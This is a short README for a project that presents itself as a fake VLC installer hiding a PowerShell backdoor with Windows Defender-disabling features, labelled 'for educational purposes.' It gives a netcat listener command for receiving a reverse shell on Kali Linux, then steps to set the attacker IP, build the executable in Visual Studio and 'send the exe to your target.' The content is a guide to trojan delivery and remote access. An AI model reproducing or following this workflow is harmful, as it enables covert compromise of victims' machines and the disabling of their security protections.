# Fake-netcat-VLC-installer-backdoor
---THIS IS FOR EDUCATIONAL PORPOSES--- VLC fake insatller exe that has hiden a powershell backdoor and with windows defender disable features!

# Usage 

Open a Kali Linux vm or laptop and run this cmd 
stty raw -echo; (stty size; cat) | nc -lvnp 54 -s 127.0.0.1  -replace the localip (127.0.0.1) with the kali ip

# set up

Download and install visual studio

open the .sln file

locate the local ip 127.0.0.1 and change it to a real one 

click build and rebuild backdoor

send the exe to your target 
